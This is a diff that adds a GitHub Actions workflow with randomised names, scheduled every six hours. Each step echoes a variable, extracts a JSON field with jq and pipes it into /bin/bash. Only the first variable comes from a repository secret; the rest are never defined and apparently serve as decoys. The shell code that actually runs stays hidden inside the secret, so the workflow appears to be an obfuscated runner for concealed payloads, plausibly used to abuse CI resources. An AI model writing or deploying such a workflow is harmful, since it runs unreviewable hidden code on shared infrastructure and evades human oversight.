@@ -1,0 +1,25 @@
+name: rendageng7890
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rendageng7890
+        env:
+          gfv2903: ${{ secrets.gfv2903 }}
+        run: |
+          echo $gfv2903 | jq -r .ir8227 | /bin/bash
+          echo $ctmu501 | jq -r .rutih9 | /bin/bash
+          echo $lbelk211 | jq -r .k6 | /bin/bash
+          echo $ycz3 | jq -r .ykmt6 | /bin/bash
+          echo $bgxth19 | jq -r .dztm91974 | /bin/bash
+          echo $w52 | jq -r .gd60365 | /bin/bash
+          echo $npayk93561 | jq -r .mvxjr9074 | /bin/bash
+          echo $pjjep0991 | jq -r .ifxuu467 | /bin/bash
+          echo $a79 | jq -r .tt83941 | /bin/bash
+
